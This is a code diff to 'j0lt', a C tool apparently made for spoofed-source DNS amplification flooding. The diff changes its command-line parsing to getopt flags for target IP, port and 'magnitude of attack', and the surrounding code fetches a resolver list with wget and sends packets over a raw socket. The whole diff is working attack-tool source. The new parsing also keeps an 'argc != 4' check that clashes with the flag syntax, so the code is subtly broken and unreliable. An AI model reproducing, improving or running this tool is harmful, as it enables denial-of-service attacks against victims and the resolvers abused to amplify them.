@@ -55,9 +55,9 @@ const char* g_ansi = {
     "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            \n"
     "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
     "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
-    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target IPv4 (spoof)    \n"
-    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
-    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>  : magnitude of attack    \n"
+    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-t <target>        : target IPv4 (spoof) \n"
+    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>          : target port         \n"
+    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>     : magnitude of attack \n"
     "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
     "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
     "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
@@ -167,10 +167,6 @@ DEFINE_INSERT_FN(qword, uint64_t)
                                     _exit(EXIT_FAILURE); \
                                     } while (0)
 
-#define     err_exit_en(en, msg) do { errno = en; perror(msg); \
-                                    exit(EXIT_FAILURE); \
-                                    } while (0)
-
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
@@ -240,7 +236,7 @@ main(int argc, char** argv)
 {
     FILE* fptr;
     char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
-    int status, i;
+    int status, i, opt;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, magnitude;
@@ -250,18 +246,34 @@ main(int argc, char** argv)
     if (argc != 4)
         err_exit("* incorrect argc");
 
-    spoofip = inet_addr(argv[ 1 ]);
-    if (spoofip == 0)
-        err_exit("* invalid spoof ip");
-
-    errno = 0;
-    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0);
-    magnitude = ( uint16_t ) strtol(argv[ 3 ], NULL, 0);
-    if (errno != 0)
-        err_exit_en(errno, "* spoof port or mgnituted incorrect");
+    opt = getopt(argc, argv, "t:p:m:");
+    do {
+        switch (opt) {
+        case 't':
+            spoofip = inet_addr(optarg);
+            if (spoofip == 0)
+                err_exit("* invalid spoof ip");
+            break;
+        case 'p':
+            errno = 0;
+            spoofport = ( uint16_t ) strtol(optarg, NULL, 0);
+            if (errno != 0)
+                err_exit("* spoof port invalid");
+            break;
+        case 'm':
+            errno = 0;
+            magnitude = ( uint16_t ) strtol(optarg, NULL, 0);
+            if (errno != 0)
+                err_exit("* magnituted invalid");
+            break;
+        case -1:
+        default: /* '?' */
+            err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
+        }
+    } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
 
     if ((pid = fork( )) < 0)
-        fork_err_exit_en(pid, "* forking child process failed\n");
+        fork_err_exit("* forking child process failed\n");
     else if (pid == 0) {
         if (execv(*g_wget, g_wget) < 0)
             fork_err_exit("* exec failed");
@@ -508,7 +520,7 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     if (raw_sockfd == -1) {
         remove(g_path);
         printf("- resolv list removed from %s\n", g_path);
-        err_exit_en(raw_sockfd, "* fatal socket error");
+        err_exit("* fatal socket error");
     }
 
     addr.sin_family = AF_INET;
